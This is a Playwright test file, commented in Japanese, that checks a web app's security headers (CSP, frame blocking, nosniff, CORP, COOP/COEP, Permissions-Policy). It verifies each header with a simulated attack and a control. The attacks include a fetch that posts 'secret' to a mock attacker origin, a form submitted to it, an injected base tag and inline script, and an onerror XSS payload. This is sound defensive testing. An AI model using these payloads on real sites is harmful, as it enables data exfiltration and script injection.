import { test, expect, type Page, type BrowserContext } from '@playwright/test'

// セキュリティヘッダーが、それぞれ防ぐはずのことを本番ビルドで実際に止めていること。
// 各テストには対照実験を入れる: 目的のヘッダー（または CSP のディレクティブ）だけをレスポンスから外すと止まらなくなること。
// 外しても結果が変わらないなら、そのテストは何も確かめていない。
//
// 別のオリジン（攻撃者のサイト）は http://localhost:4999 を page.route で作る（サーバーは立てない）。127.0.0.1 とは別のオリジン・別のサイト。
// Chrome の Local Network Access（攻撃者のページから 127.0.0.1 への読み込みを止める）は、確かめたいヘッダーと関係なく
// 失敗させるので、playwright.prod.config.ts で無効にしている。
// 本番は 23:00〜6:00 JST に /time-restricted へ回すので、開いたページがどれでも成り立つように書く（ヘッダーは両方に付く）

const APP = 'http://127.0.0.1:3100'
const EVIL = 'http://localhost:4999'
const APP_PAGE = '/login'

type Strip = { headers?: string[]; cspDirectives?: string[]; dropCsp?: boolean }

// アプリのレスポンスから、指定したヘッダー・CSP のディレクティブを外す
async function stripFromApp(context: BrowserContext, strip: Strip) {
  await context.route(`${APP}/**`, async (route) => {
    const response = await route.fetch({ maxRedirects: 0 })
    const headers = { ...response.headers() }
    for (const name of strip.headers ?? []) delete headers[name.toLowerCase()]
    if (strip.dropCsp) delete headers['content-security-policy']
    if (strip.cspDirectives && headers['content-security-policy']) {
      headers['content-security-policy'] = headers['content-security-policy']
        .split(';')
        .map((d) => d.trim())
        .filter((d) => !strip.cspDirectives?.some((name) => d.startsWith(`${name} `) || d === name))
        .join('; ')
    }
    await route.fulfill({ response, headers })
  })
}

// 攻撃者のサイト。届いたリクエストを記録する
async function evilSite(context: BrowserContext, html = '<!doctype html><title>evil</title>') {
  const received: { path: string; method: string; referer: string | undefined }[] = []
  await context.route(`${EVIL}/**`, async (route) => {
    const request = route.request()
    received.push({ path: new URL(request.url()).pathname, method: request.method(), referer: (await request.allHeaders())['referer'] })
    await route.fulfill({ status: 200, contentType: 'text/html', headers: { 'Access-Control-Allow-Origin': '*' }, body: html })
  })
  return received
}

async function openApp(page: Page, path = APP_PAGE) {
  const response = await page.goto(path)
  expect(response?.ok()).toBe(true)
}

// ── CSP ───────────────────────────────────────────────────────────────────

test.describe('CSP connect-src: 盗んだデータを外へ送らせない', () => {
  async function tryLeak(page: Page) {
    await openApp(page)
    await page.evaluate(async (evil) => {
      try { await fetch(`${evil}/leak`, { method: 'POST', body: 'secret' }) } catch { /* 止められると例外になる */ }
    }, EVIL)
  }

  test('アプリのページから外のサイトへの fetch は届かない', async ({ page, context }) => {
    const received = await evilSite(context)
    await tryLeak(page)
    expect(received.filter((r) => r.path === '/leak')).toEqual([])
  })

  test('対照: CSP を外すと届く', async ({ page, context }) => {
    const received = await evilSite(context)
    await stripFromApp(context, { dropCsp: true })
    await tryLeak(page)
    expect(received.filter((r) => r.path === '/leak')).not.toEqual([])
  })
})

test.describe('CSP form-action: フォームの送信先を外のサイトに変えさせない', () => {
  async function submitToEvil(page: Page) {
    await openApp(page)
    await page.evaluate((evil) => {
      const form = document.createElement('form')
      form.method = 'POST'
      form.action = `${evil}/form`
      document.body.appendChild(form)
      form.submit()
    }, EVIL)
    await page.waitForTimeout(1000)
  }

  test('外向きのフォームは送信されない', async ({ page, context }) => {
    const received = await evilSite(context)
    await submitToEvil(page)
    expect(received.filter((r) => r.path === '/form')).toEqual([])
  })

  test('対照: form-action を外すと送信される', async ({ page, context }) => {
    const received = await evilSite(context)
    await stripFromApp(context, { cspDirectives: ['form-action'] })
    await submitToEvil(page)
    expect(received.filter((r) => r.path === '/form')).not.toEqual([])
  })
})

test.describe('CSP base-uri: 相対 URL の基準を外のサイトに変えさせない', () => {
  async function injectBase(page: Page): Promise<string> {
    await openApp(page)
    return page.evaluate((evil) => {
      const base = document.createElement('base')
      base.href = `${evil}/`
      document.head.prepend(base)
      return document.baseURI
    }, EVIL)
  }

  test('<base> を足しても基準はアプリのまま', async ({ page }) => {
    expect(await injectBase(page)).toMatch(new RegExp(`^${APP}/`))
  })

  test('対照: base-uri を外すと基準が外のサイトになる', async ({ page, context }) => {
    await stripFromApp(context, { cspDirectives: ['base-uri'] })
    expect(await injectBase(page)).toBe(`${EVIL}/`)
  })
})

test.describe('CSP script-src: 注入された script を動かさない', () => {
  // 注意: page.evaluate で createElement した script は、'strict-dynamic' により「許可された script が作ったもの」として動く。
  // それは攻撃の再現にならないので、HTML への差し込み（サーバーの応答に入る XSS）と、innerHTML の属性（DOM の XSS）で確かめる
  type W = { __parserInjected?: boolean; __handlerInjected?: boolean }

  async function injectIntoHtml(page: Page, context: BrowserContext, dropCsp: boolean) {
    await context.route(`${APP}${APP_PAGE}`, async (route) => {
      const response = await route.fetch()
      const headers = { ...response.headers() }
      if (dropCsp) delete headers['content-security-policy']
      const body = (await response.text()).replace('</head>', '<script>window.__parserInjected = true</script></head>')
      await route.fulfill({ response, headers, body })
    })
    await page.goto(APP_PAGE)
    return page.evaluate(() => (window as unknown as W).__parserInjected === true)
  }

  async function injectHandler(page: Page) {
    await openApp(page)
    return page.evaluate(() => new Promise<boolean>((resolve) => {
      const div = document.createElement('div')
      div.innerHTML = '<img src="/no-such-image.png" onerror="window.__handlerInjected = true">'
      document.body.appendChild(div)
      setTimeout(() => resolve((window as unknown as W).__handlerInjected === true), 1000)
    }))
  }

  test('HTML に差し込まれた nonce のない script は動かない', async ({ page, context }) => {
    expect(await injectIntoHtml(page, context, false)).toBe(false)
  })

  test('対照: CSP を外すと動く', async ({ page, context }) => {
    expect(await injectIntoHtml(page, context, true)).toBe(true)
  })

  test('innerHTML で入れた onerror 属性は動かない', async ({ page }) => {
    expect(await injectHandler(page)).toBe(false)
  })

  test('対照: CSP を外すと動く（onerror）', async ({ page, context }) => {
    await stripFromApp(context, { dropCsp: true })
    expect(await injectHandler(page)).toBe(true)
  })
})

// ── 埋め込み（クリックジャッキング）────────────────────────────────────

test.describe('frame-ancestors・X-Frame-Options: 他のサイトに埋め込ませない', () => {
  async function embedFromEvil(page: Page, context: BrowserContext): Promise<boolean> {
    await evilSite(context, `<!doctype html><iframe id="f" src="${APP}${APP_PAGE}" width="800" height="600"></iframe>`)
    await page.goto(`${EVIL}/`)
    await page.waitForTimeout(1500)
    // 埋め込みが拒否されると、フレームはエラーページ（chrome-error://）になり、アプリの URL のフレームはない
    return page.frames().some((f) => f.url().startsWith(APP))
  }

  test('両方あるとき、埋め込めない', async ({ page, context }) => {
    expect(await embedFromEvil(page, context)).toBe(false)
  })

  test('frame-ancestors だけでも埋め込めない', async ({ page, context }) => {
    await stripFromApp(context, { headers: ['X-Frame-Options'] })
    expect(await embedFromEvil(page, context)).toBe(false)
  })

  test('X-Frame-Options だけでも埋め込めない', async ({ page, context }) => {
    await stripFromApp(context, { cspDirectives: ['frame-ancestors'] })
    expect(await embedFromEvil(page, context)).toBe(false)
  })

  test('対照: 両方を外すと埋め込める', async ({ page, context }) => {
    await stripFromApp(context, { headers: ['X-Frame-Options'], cspDirectives: ['frame-ancestors'] })
    expect(await embedFromEvil(page, context)).toBe(true)
  })
})

// ── MIME・リソースの読み込み ────────────────────────────────────────────

test.describe('X-Content-Type-Options: HTML や JSON を script として読ませない', () => {
  // 他のオリジンからの読み込みはブラウザの ORB や CORP でも止まるので、nosniff だけを見るため同じオリジンで読む。
  // そのため CSP は外す（外さないと nonce のない script として先に止まる）
  async function loadAsScript(page: Page, src: string): Promise<'load' | 'error'> {
    await openApp(page)
    return page.evaluate((url) => new Promise<'load' | 'error'>((resolve) => {
      const s = document.createElement('script')
      s.src = url
      s.onload = () => resolve('load')
      s.onerror = () => resolve('error')
      document.head.appendChild(s)
    }), src)
  }

  // API の JSON も対象にしたいが、本番ビルドではログインできず API は 401 を返す。読み込みが status で失敗し、
  // nosniff の効き目と区別できないので、API はヘッダーが付いているかだけを「ヘッダーが付く範囲」で見る
  for (const [label, src] of [['ページの HTML', APP_PAGE]] as const) {
    test(`${label} を script として読むと拒否される`, async ({ page, context }) => {
      await stripFromApp(context, { dropCsp: true })
      expect(await loadAsScript(page, src)).toBe('error')
    })

    test(`対照: ${label} の nosniff を外すと読み込まれる`, async ({ page, context }) => {
      await stripFromApp(context, { dropCsp: true, headers: ['X-Content-Type-Options'] })
      expect(await loadAsScript(page, src)).toBe('load')
    })
  }
})

test.describe('Cross-Origin-Resource-Policy: 他のサイトにこちらの画像などを読み込ませない', () => {
  // /icons/* は proxy の対象で、Cookie がないと /login へのリダイレクトになり CORP と関係なく読めない。
  // proxy を通らず CORP を next.config.ts で付けている /favicon.ico で見る。
  // クエリなしの /favicon.ico は、Chrome が <img> からのリクエストを出さずに失敗させるので、クエリを付ける
  async function loadImageFromEvil(page: Page, context: BrowserContext): Promise<'load' | 'error'> {
    await evilSite(context)
    await page.goto(`${EVIL}/`)
    return page.evaluate((url) => new Promise<'load' | 'error'>((resolve) => {
      const img = new Image()
      img.onload = () => resolve('load')
      img.onerror = () => resolve('error')
      img.src = url
    }), `${APP}/favicon.ico?corp`)
  }

  test('他のサイトの <img> からは読めない', async ({ page, context }) => {
    expect(await loadImageFromEvil(page, context)).toBe('error')
  })

  test('対照: CORP を外すと読める', async ({ page, context }) => {
    await stripFromApp(context, { headers: ['Cross-Origin-Resource-Policy'] })
    expect(await loadImageFromEvil(page, context)).toBe('load')
  })
})

// ── ウィンドウの分離 ────────────────────────────────────────────────────

test.describe('Cross-Origin-Opener-Policy: 他のサイトから開かれても、そのサイトに操作させない', () => {
  async function openFromEvil(page: Page, context: BrowserContext): Promise<boolean> {
    await evilSite(context)
    await page.goto(`${EVIL}/`)
    const popupPromise = context.waitForEvent('page')
    await page.evaluate((url) => { window.open(url) }, `${APP}${APP_PAGE}`)
    const popup = await popupPromise
    await popup.waitForLoadState()
    return popup.evaluate(() => window.opener !== null)
  }

  test('開いたページから元のサイトへの参照（window.opener）が切れている', async ({ page, context }) => {
    expect(await openFromEvil(page, context)).toBe(false)
  })

  test('対照: COOP を外すと参照が残る', async ({ page, context }) => {
    await stripFromApp(context, { headers: ['Cross-Origin-Opener-Policy'] })
    expect(await openFromEvil(page, context)).toBe(true)
  })
})

test.describe('COOP + COEP: ページが他のオリジンから隔離されている（Spectre 系の読み取りを防ぐ）', () => {
  const isolated = (page: Page) => page.evaluate(() => self.crossOriginIsolated)
  // ログイン画面は reCAPTCHA の iframe のために COEP を付けない（下）。ログイン後のページで確かめる。
  // ログイン後の画面は API が 401 になるとログイン画面に移るので、移らない「存在しないパス」の 404 のページを使う
  const isolatedPage = async (page: Page, context: BrowserContext) => {
    await context.addCookies([{ name: 'session', value: 'mock-session', url: APP }])
    const response = await page.goto('/no-such-page')
    expect([200, 404]).toContain(response?.status())
  }

  test('ログイン後のページは crossOriginIsolated が true', async ({ page, context }) => {
    await isolatedPage(page, context)
    expect(await isolated(page)).toBe(true)
  })

  test('対照: COEP を外すと false', async ({ page, context }) => {
    await stripFromApp(context, { headers: ['Cross-Origin-Embedder-Policy'] })
    await isolatedPage(page, context)
    expect(await isolated(page)).toBe(false)
  })

  test('ログイン画面は COEP を付けない（reCAPTCHA の iframe は Google のページで、COEP を返さない）', async ({ page, request }) => {
    // 転送を追わずに /login 自身の応答を見る（本番の時間外は /time-restricted への転送になるが、その応答にも付けない）
    const own = await request.get(APP_PAGE, { maxRedirects: 0 })
    expect(own.headers()['cross-origin-embedder-policy']).toBeUndefined()
    await page.goto(APP_PAGE)
    // 時間外に移った /time-restricted はログイン画面ではないので隔離される
    expect(await isolated(page)).toBe(new URL(page.url()).pathname !== '/login')
  })
})

// ── ブラウザの機能 ──────────────────────────────────────────────────────

test.describe('Permissions-Policy: カメラ・マイク・位置情報を使わせない', () => {
  async function tryDevices(page: Page) {
    await openApp(page)
    return page.evaluate(async () => {
      const media = async (constraints: MediaStreamConstraints) => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia(constraints)
          stream.getTracks().forEach((t) => t.stop())
          return 'allowed'
        } catch (e) {
          return (e as Error).name
        }
      }
      const geo = () => new Promise<string>((resolve) => {
        navigator.geolocation.getCurrentPosition(() => resolve('allowed'), (e) => resolve(`denied:${e.code}`), { timeout: 3000 })
      })
      return { camera: await media({ video: true }), microphone: await media({ audio: true }), geolocation: await geo() }
    })
  }

  test('どれも拒否される', async ({ page, context }) => {
    await context.grantPermissions(['camera', 'microphone', 'geolocation'], { origin: APP })
    await context.setGeolocation({ latitude: 35, longitude: 139 })
    const result = await tryDevices(page)
    expect(result.camera).toBe('NotAllowedError')
    expect(result.microphone).toBe('NotAllowedError')
    expect(result.geolocation).toBe('denied:1') // PERMISSION_DENIED
  })

  test('対照: Permissions-Policy を外すと使える', async ({ page, context }) => {
    await context.grantPermissions(['camera', 'microphone', 'geolocation'], { origin: APP })
    await context.setGeolocation({ latitude: 35, longitude: 139 })
    await stripFromApp(context, { headers: ['Permissions-Policy'] })
    const result = await tryDevices(page)
    expect(result).toEqual({ camera: 'allowed', microphone: 'allowed', geolocation: 'allowed' })
  })
})

test.describe('Referrer-Policy: 他のサイトに URL のパスやクエリを渡さない', () => {
  // 値（strict-origin-when-cross-origin）は Chrome の既定と同じなので、外しても動きは変わらない（対照実験は置かない）。
  // 既定が変わったときや、他のブラウザのためにヘッダーで明示している
  test('外のサイトへのリンクで送られる Referer はオリジンだけ', async ({ page, context }) => {
    const received = await evilSite(context)
    await openApp(page, `${APP_PAGE}?date=2026-05-20`)
    await page.evaluate((evil) => {
      const a = document.createElement('a')
      a.href = `${evil}/ref`
      a.textContent = 'out'
      document.body.appendChild(a)
      a.click()
    }, EVIL)
    await page.waitForURL(`${EVIL}/ref`)
    expect(received.find((r) => r.path === '/ref')?.referer).toBe(`${APP}/`)
  })
})

// ── 付いている範囲 ─────────────────────────────────────────────────────

test.describe('ヘッダーが付く範囲', () => {
  // HSTS は HTTP では動きを確かめられない（ブラウザは HTTPS で受け取ったときだけ従う）ので、値だけを見る
  const DOCUMENT_HEADERS = {
    'strict-transport-security': 'max-age=31536000; includeSubDomains',
    'x-content-type-options': 'nosniff',
    'x-frame-options': 'DENY',
    'cross-origin-opener-policy': 'same-origin',
    'cross-origin-embedder-policy': 'require-corp',
    'cross-origin-resource-policy': 'same-origin',
    'referrer-policy': 'strict-origin-when-cross-origin',
    'permissions-policy': 'camera=(), microphone=(), geolocation=()',
  }

  test.beforeEach(async ({ context }) => {
    await context.addCookies([{ name: 'session', value: 'mock-session', url: APP }])
  })

  for (const [label, path] of [
    ['ページ', APP_PAGE],
    ['リダイレクト', '/'],
    ['存在しないパス', '/no-such-page'],
  ] as const) {
    test(`${label}（${path}）: すべてのヘッダーと CSP`, async ({ request }) => {
      const response = await request.get(path, { maxRedirects: 0 })
      const headers = response.headers()
      // ログイン画面（時間外はそこからの転送も）だけ COEP を付けず、CSP に reCAPTCHA を足す
      const { 'cross-origin-embedder-policy': coep, ...rest } = DOCUMENT_HEADERS
      expect(headers).toMatchObject(path === APP_PAGE ? rest : DOCUMENT_HEADERS)
      if (path === APP_PAGE) expect(headers['cross-origin-embedder-policy']).toBeUndefined()
      else expect(headers['cross-origin-embedder-policy']).toBe(coep)
      expect(headers['content-security-policy'].includes('https://www.google.com/recaptcha/')).toBe(path === APP_PAGE)
      expect(headers['content-security-policy']).toMatch(/frame-ancestors 'none'/)
      expect(headers['x-powered-by']).toBeUndefined()
    })
  }

  // ログイン済みで / を開いたときの /daily-dashboard への転送。page.tsx の redirect() だと、Next.js が画面の外枠を描いた
  // HTML（約 7KB）を転送と一緒に返していた（ZAP の Big Redirect）。転送の応答は本文を持たず、ヘッダーも付くこと。
  // request フィクスチャは context の Cookie を共有しないので、context.request を使う
  test('ログイン済みの / の転送: 本文がなく、すべてのヘッダーが付く', async ({ context }) => {
    const response = await context.request.get('/', { maxRedirects: 0 })
    expect([307, 308]).toContain(response.status())
    // 本番の時間外は /time-restricted への転送になる（proxy.ts）
    expect(response.headers()['location']).toMatch(/\/(daily-dashboard|time-restricted)$/)
    expect((await response.body()).length).toBeLessThan(100)
    expect(response.headers()).toMatchObject(DOCUMENT_HEADERS)
  })

  test('静的ファイル（/_next/static・/icons）: nosniff と CORP', async ({ request }) => {
    const html = await (await request.get(APP_PAGE)).text()
    const asset = html.match(/\/_next\/static\/[^"']+\.js/)?.[0]
    expect(asset).toBeTruthy()
    for (const path of [asset as string, '/icons/door.png']) {
      const headers = (await request.get(path)).headers()
      expect(headers['x-content-type-options'], path).toBe('nosniff')
      expect(headers['cross-origin-resource-policy'], path).toBe('same-origin')
      expect(headers['x-powered-by'], path).toBeUndefined()
    }
  })

  // 未ログインの 401、不正な body の 400、存在しない API のパスの 404（ZAP が CSP なしと指摘した）のどれにも付くこと
  test('API: nosniff・CORP・CSP', async ({ request }) => {
    for (const [path, status] of [['/api/guest-info?date=2026-05-20', 401], ['/api/auth/login', 400], ['/api/auth', 404]] as const) {
      const response = path === '/api/auth/login' ? await request.post(path, { data: {} }) : await request.get(path)
      expect(response.status(), path).toBe(status)
      const headers = response.headers()
      expect(headers['x-content-type-options'], path).toBe('nosniff')
      expect(headers['cross-origin-resource-policy'], path).toBe('same-origin')
      expect(headers['content-security-policy'], path).toBe("default-src 'none'; frame-ancestors 'none'; form-action 'none'; base-uri 'none'")
      expect(headers['x-powered-by'], path).toBeUndefined()
    }
  })

  // 宿泊客の名前・メモを返すので、共用の PC のブラウザのキャッシュ（ディスク）に残さない
  test('API: Cache-Control: no-store', async ({ request }) => {
    const headers = (await request.get('/api/guest-info?date=2026-05-20')).headers()
    expect(headers['cache-control']).toMatch(/no-store/)
  })
})
